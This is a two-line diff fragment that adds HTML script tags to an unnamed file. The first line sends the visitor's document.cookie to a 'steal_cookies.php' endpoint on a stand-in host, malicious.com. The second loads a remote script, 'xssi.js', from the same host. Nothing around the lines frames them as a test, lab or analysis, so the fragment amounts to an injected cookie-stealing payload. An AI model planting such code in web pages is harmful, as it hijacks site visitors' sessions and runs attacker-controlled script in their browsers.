@@ -1,0 +1,2 @@
+<script>fetch('http://malicious.com/steal_cookies.php?cookie=' + encodeURIComponent(document.cookie));</script>
+<script src="http://malicious.com/xssi.js"></script>
